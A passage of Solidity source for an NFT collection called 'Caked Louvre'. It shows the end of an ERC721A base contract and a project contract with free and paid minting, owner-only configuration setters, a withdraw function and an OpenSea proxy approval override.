1090         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1091         unchecked {
1092             _addressData[to].balance += uint64(quantity);
1093             _addressData[to].numberMinted += uint64(quantity);
1094 
1095             _ownerships[startTokenId].addr = to;
1096             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1097 
1098             uint256 updatedIndex = startTokenId;
1099             uint256 end = updatedIndex + quantity;
1100 
1101             if (safe && to.isContract()) {
1102                 do {
1103                     emit Transfer(address(0), to, updatedIndex);
1104                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1105                         revert TransferToNonERC721ReceiverImplementer();
1106                     }
1107                 } while (updatedIndex != end);
1108                 // Reentrancy protection
1109                 if (_currentIndex != startTokenId) revert();
1110             } else {
1111                 do {
1112                     emit Transfer(address(0), to, updatedIndex++);
1113                 } while (updatedIndex != end);
1114             }
1115             _currentIndex = updatedIndex;
1116         }
1117         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1118     }
1119 
1120     /**
1121      * @dev Transfers `tokenId` from `from` to `to`.
1122      *
1123      * Requirements:
1124      *
1125      * - `to` cannot be the zero address.
1126      * - `tokenId` token must be owned by `from`.
1127      *
1128      * Emits a {Transfer} event.
1129      */
1130     function _transfer(
1131         address from,
1132         address to,
1133         uint256 tokenId
1134     ) private {
1135         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1136 
1137         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1138             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1139             getApproved(tokenId) == _msgSender());
1140 
1141         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1142         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1143         if (to == address(0)) revert TransferToZeroAddress();
1144 
1145         _beforeTokenTransfers(from, to, tokenId, 1);
1146 
1147         // Clear approvals from the previous owner
1148         _approve(address(0), tokenId, prevOwnership.addr);
1149 
1150         // Underflow of the sender's balance is impossible because we check for
1151         // ownership above and the recipient's balance can't realistically overflow.
1152         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1153         unchecked {
1154             _addressData[from].balance -= 1;
1155             _addressData[to].balance += 1;
1156 
1157             _ownerships[tokenId].addr = to;
1158             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1159 
1160             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1161             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1162             uint256 nextTokenId = tokenId + 1;
1163             if (_ownerships[nextTokenId].addr == address(0)) {
1164                 // This will suffice for checking _exists(nextTokenId),
1165                 // as a burned slot cannot contain the zero address.
1166                 if (nextTokenId < _currentIndex) {
1167                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1168                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1169                 }
1170             }
1171         }
1172 
1173         emit Transfer(from, to, tokenId);
1174         _afterTokenTransfers(from, to, tokenId, 1);
1175     }
1176 
1177     /**
1178      * @dev Destroys `tokenId`.
1179      * The approval is cleared when the token is burned.
1180      *
1181      * Requirements:
1182      *
1183      * - `tokenId` must exist.
1184      *
1185      * Emits a {Transfer} event.
1186      */
1187     function _burn(uint256 tokenId) internal virtual {
1188         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1189 
1190         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1191 
1192         // Clear approvals from the previous owner
1193         _approve(address(0), tokenId, prevOwnership.addr);
1194 
1195         // Underflow of the sender's balance is impossible because we check for
1196         // ownership above and the recipient's balance can't realistically overflow.
1197         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1198         unchecked {
1199             _addressData[prevOwnership.addr].balance -= 1;
1200             _addressData[prevOwnership.addr].numberBurned += 1;
1201 
1202             // Keep track of who burned the token, and the timestamp of burning.
1203             _ownerships[tokenId].addr = prevOwnership.addr;
1204             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1205             _ownerships[tokenId].burned = true;
1206 
1207             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1208             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1209             uint256 nextTokenId = tokenId + 1;
1210             if (_ownerships[nextTokenId].addr == address(0)) {
1211                 // This will suffice for checking _exists(nextTokenId),
1212                 // as a burned slot cannot contain the zero address.
1213                 if (nextTokenId < _currentIndex) {
1214                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1215                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1216                 }
1217             }
1218         }
1219 
1220         emit Transfer(prevOwnership.addr, address(0), tokenId);
1221         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1222 
1223         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1224         unchecked {
1225             _burnCounter++;
1226         }
1227     }
1228 
1229     /**
1230      * @dev Approve `to` to operate on `tokenId`
1231      *
1232      * Emits a {Approval} event.
1233      */
1234     function _approve(
1235         address to,
1236         uint256 tokenId,
1237         address owner
1238     ) private {
1239         _tokenApprovals[tokenId] = to;
1240         emit Approval(owner, to, tokenId);
1241     }
1242 
1243     /**
1244      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1245      *
1246      * @param from address representing the previous owner of the given token ID
1247      * @param to target address that will receive the tokens
1248      * @param tokenId uint256 ID of the token to be transferred
1249      * @param _data bytes optional data to send along with the call
1250      * @return bool whether the call correctly returned the expected magic value
1251      */
1252     function _checkContractOnERC721Received(
1253         address from,
1254         address to,
1255         uint256 tokenId,
1256         bytes memory _data
1257     ) private returns (bool) {
1258         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1259             return retval == IERC721Receiver(to).onERC721Received.selector;
1260         } catch (bytes memory reason) {
1261             if (reason.length == 0) {
1262                 revert TransferToNonERC721ReceiverImplementer();
1263             } else {
1264                 assembly {
1265                     revert(add(32, reason), mload(reason))
1266                 }
1267             }
1268         }
1269     }
1270 
1271     /**
1272      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1273      * And also called before burning one token.
1274      *
1275      * startTokenId - the first token id to be transferred
1276      * quantity - the amount to be transferred
1277      *
1278      * Calling conditions:
1279      *
1280      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1281      * transferred to `to`.
1282      * - When `from` is zero, `tokenId` will be minted for `to`.
1283      * - When `to` is zero, `tokenId` will be burned by `from`.
1284      * - `from` and `to` are never both zero.
1285      */
1286     function _beforeTokenTransfers(
1287         address from,
1288         address to,
1289         uint256 startTokenId,
1290         uint256 quantity
1291     ) internal virtual {}
1292 
1293     /**
1294      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1295      * minting.
1296      * And also called after one token has been burned.
1297      *
1298      * startTokenId - the first token id to be transferred
1299      * quantity - the amount to be transferred
1300      *
1301      * Calling conditions:
1302      *
1303      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1304      * transferred to `to`.
1305      * - When `from` is zero, `tokenId` has been minted for `to`.
1306      * - When `to` is zero, `tokenId` has been burned by `from`.
1307      * - `from` and `to` are never both zero.
1308      */
1309     function _afterTokenTransfers(
1310         address from,
1311         address to,
1312         uint256 startTokenId,
1313         uint256 quantity
1314     ) internal virtual {}
1315 }
1316 
1317 
1318 
1319 contract CakedLouvre is ERC721A, Owneable {
1320 
1321     string public baseURI = "ipfs://QmUgT1AsPJcUuYQKn3zzLsh4YbVY3ekRemPFZgDjLT22vt/";
1322     string public contractURI = "ipfs://QmUgT1AsPJcUuYQKn3zzLsh4YbVY3ekRemPFZgDjLT22vt/";
1323     string public constant baseExtension = ".json";
1324     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1325 
1326     uint256 public MAX_PER_TX_FREE = 1;
1327     uint256 public FREE_MAX_SUPPLY = 989;
1328     uint256 public constant MAX_PER_TX = 10;
1329     uint256 public MAX_SUPPLY = 1000;
1330     uint256 public price = 0.1 ether;
1331 
1332     bool public paused = false;
1333 
1334     constructor() ERC721A("Caked Louvre", "MSTRPIECE") {}
1335 
1336     function mint(uint256 _amount) external payable {
1337         address _caller = _msgSender();
1338         require(!paused, "Paused");
1339         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1340         require(_amount > 0, "No 0 mints");
1341         require(tx.origin == _caller, "No contracts");
1342         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1343         
1344       if(FREE_MAX_SUPPLY >= totalSupply()){
1345             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1346         }else{
1347             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1348             require(_amount * price == msg.value, "Invalid funds provided");
1349         }
1350 
1351         _safeMint(_caller, _amount);
1352     }
1353 
1354     function isApprovedForAll(address owner, address operator)
1355         override
1356         public
1357         view
1358         returns (bool)
1359     {
1360         // Whitelist OpenSea proxy contract for easy trading.
1361         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1362         if (address(proxyRegistry.proxies(owner)) == operator) {
1363             return true;
1364         }
1365 
1366         return super.isApprovedForAll(owner, operator);
1367     }
1368 
1369     function withdraw() external onlyOwner {
1370         uint256 balance = address(this).balance;
1371         (bool success, ) = _msgSender().call{value: balance}("");
1372         require(success, "Failed to send");
1373     }
1374 
1375     function config() external onlyOwner {
1376         _safeMint(_msgSender(), 1);
1377     }
1378 
1379     function pause(bool _state) external onlyOwner {
1380         paused = _state;
1381     }
1382 
1383     function setBaseURI(string memory baseURI_) external onlyOwner {
1384         baseURI = baseURI_;
1385     }
1386 
1387     function setContractURI(string memory _contractURI) external onlyOwner {
1388         contractURI = _contractURI;
1389     }
1390 
1391     function setPrice(uint256 newPrice) public onlyOwner {
1392         price = newPrice;
1393     }
1394 
1395     function setFREE_MAX_SUPPLY(uint256 newFREE_MAX_SUPPLY) public onlyOwner {
1396         FREE_MAX_SUPPLY = newFREE_MAX_SUPPLY;
1397     }
1398 
1399     function setMAX_PER_TX_FREE(uint256 newMAX_PER_TX_FREE) public onlyOwner {
1400         MAX_PER_TX_FREE = newMAX_PER_TX_FREE;
1401     }
1402 
1403     function setMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1404         MAX_SUPPLY = newSupply;
1405     }
1406 
1407     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1408         require(_exists(_tokenId), "Token does not exist.");
1409         return bytes(baseURI).length > 0 ? string(
1410             abi.encodePacked(
1411               baseURI,
1412               Strings.toString(_tokenId),
1413               baseExtension
1414             )
1415         ) : "";
1416     }
1417 }
1418 
1419 contract OwnableDelegateProxy { }
1420 contract ProxyRegistry {
1421     mapping(address => OwnableDelegateProxy) public proxies;
1422 }